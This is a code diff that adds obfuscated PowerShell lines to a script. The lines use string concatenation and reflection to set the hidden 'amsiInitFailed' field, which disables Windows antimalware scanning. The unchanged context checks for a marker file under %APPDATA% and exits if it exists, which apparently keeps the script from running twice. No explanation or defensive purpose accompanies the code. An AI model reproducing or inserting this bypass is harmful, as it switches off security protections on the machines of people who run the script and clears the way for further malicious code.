@@ -1,3 +1,7 @@
+${W} = ('System.'+'Man'+'ag'+'ement.A'+'u'+'toma'+'tion'+'.'+'A');${c} = 'si';${M} = ('U'+'tils')
+${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${c},${m}))
+${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
+${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})
 
 if (&('Tes'+'t'+'-Path') -Path "$env:APPDATA\Microsoft\2504706.txt") {
     exit
